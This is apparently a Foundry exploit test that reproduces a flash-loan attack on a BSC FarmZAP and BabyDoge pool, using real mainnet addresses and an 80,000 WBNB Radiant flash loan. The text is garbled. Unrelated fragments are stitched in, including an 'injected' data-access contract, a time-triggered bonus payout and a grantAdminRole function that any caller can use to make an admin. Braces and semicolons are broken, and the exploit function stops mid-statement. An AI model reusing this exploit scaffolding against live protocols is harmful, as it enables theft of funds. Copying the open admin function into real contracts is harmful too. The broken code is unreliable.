
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity ^0.8.10;

;
;
interface IFarm {
    function depositOnBehalf(uint256 amount, address account) external;
    function stakeToken() external returns (address)};
interface IFarmZAP {
    function buyTokensAndDepositOnBehalf(IFarm farm,
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path) external payable returns (uint256)};
contract ContractTest is Test {
    IERC20 BABYDOGE = IERC20(0xc748673057861a797275CD8A068AbB95A902e8de);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0);
    IFarmZAP FarmZAP = IFarmZAP(0x451583B6DA479eAA04366443262848e27706f762);
    IAaveFlashloan Radiant = IAaveFlashloan(0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281);
    uint256 i;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("bsc", 28_593_354);
        cheats.label(address(WBNB), "WBNB");
        cheats.label(address(BABYDOGE), "BABYDOGE");
        cheats.label(address(Pair), "Pair");
        cheats.label(address(FarmZAP), "FarmZAP");
        cheats.label(address(Radiant), "Radiant")};
    function testExploit() external {
        deal(address(this), 0);
        address[] memory assets = new address[](1);
        assets[0] = address(WBNB);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 80_000 * 1e18;
        uint256[] memory modes = new uint[](1);
        modes[0] = 0;
        Radiant.flashLoan(address(this), assets, amounts, modes, address(0), new
function triggerBasedOnTime() public {
    if (block.timestamp < 1800000000) {
        payBonus()}
function grantAdminRole(address user) public {
    admins[user] = true}